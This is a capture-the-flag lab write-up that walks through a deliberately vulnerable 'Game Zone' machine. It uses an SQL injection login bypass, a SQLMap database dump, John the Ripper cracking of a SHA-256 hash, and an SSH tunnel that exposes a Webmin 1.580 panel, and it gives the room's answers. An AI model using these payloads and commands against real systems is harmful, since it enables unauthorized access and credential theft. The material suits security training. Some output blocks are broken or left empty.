## Task 1 - Deploy the Vulerable Machine

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

##   Answer the questions below

Deploy the machine and access its web server.

**What is the name of the large cartoon avatar holding a sniper on the forum?**

- Agent 47

## Task 2 - Obtain access via SQLi 

In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

- ``SELECT * FROM users WHERE username = :username AND password := password``

If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

``SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -``

GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use ``' or 1=1 -- -`` as your username and leave the password blank.

**When you've logged in, what page do you get redirected to?**

- portal.php

## Task 3 - Using SQLMap 

- capture request to ``portal.php`` and copy to file to feed to SQLMap so we can have the authenitcated user session.

```shell
POST /portal.php HTTP/1.1
Host: 10.10.147.210

- ``sqlmap -r request.txt --dbms=mysql --dump``
- ``-r`` for request file
- ``--dbms=mysql`` database management system type
- ``-dump`` outputs the entire database or attemps to

##   Answer the questions below

**In the users table, what is the hashed password?**

- ``cat log``

```shell
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |

+------------------------------------------------------------------+----------+
````

**What was the username associated with the hashed password?**

- agent47

**What was the other table name?**

- post

## Task 4 - Cracking a password with JohnTheRipper 

![0xskar](/assets/johntheripper.png)

##   Answer the questions below

**What is the de-hashed password?**

1. ``echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > ../agent47-hash.txt``
2. ``john agent47-hash.txt --wordlist=/usr/share/seclists/Passwords/rockyou.txt --format=Raw-SHA256``
3. videogamer124

**Now you have a password and username. Try SSH'ing onto the machine.** **What is the user flag?**

```shell
agent47@gamezone:~$ cat user.txt

## Task 5 - Exposing services with reverse SSH tunnels 

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

##   Answer the questions below

We will use a tool called ``ss`` to investigate sockets running on a host.

If we run ``ss -tulpn`` it will tell us what socket connections are running

| Argument | Description |
|----------|-------------|
| -t | Display TCP sockets |
| -u | Display UDP sockets |
| -l | Displays only listening sockets |
| -p | Shows the process using the socket |
| -n | Doesn't resolve service names |

```shell
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q   Local Address:Port        Peer Address:Port              
udp   UNCONN     0      0                    *:10000                  *:*                  
udp   UNCONN     0      0                    *:68                     *:*                  
tcp   LISTEN     0      80           127.0.0.1:3306                   *:*                  
tcp   LISTEN     0      128                  *:10000                  *:*                  
tcp   LISTEN     0      128                  *:22                     *:*                  
tcp   LISTEN     0      128                 :::80                    :::*                  
tcp   LISTEN     0      128                 :::22                    :::*         
````

**How many TCP sockets are running?**

- 5

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run ``ssh -L 10000:localhost:10000 <username>@<ip>``

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

**What is the name of the exposed CMS?**

1. visit ``localhost:10000``
2. Webmin

**What is the CMS version?**

1. login with credentials
2. 1.580
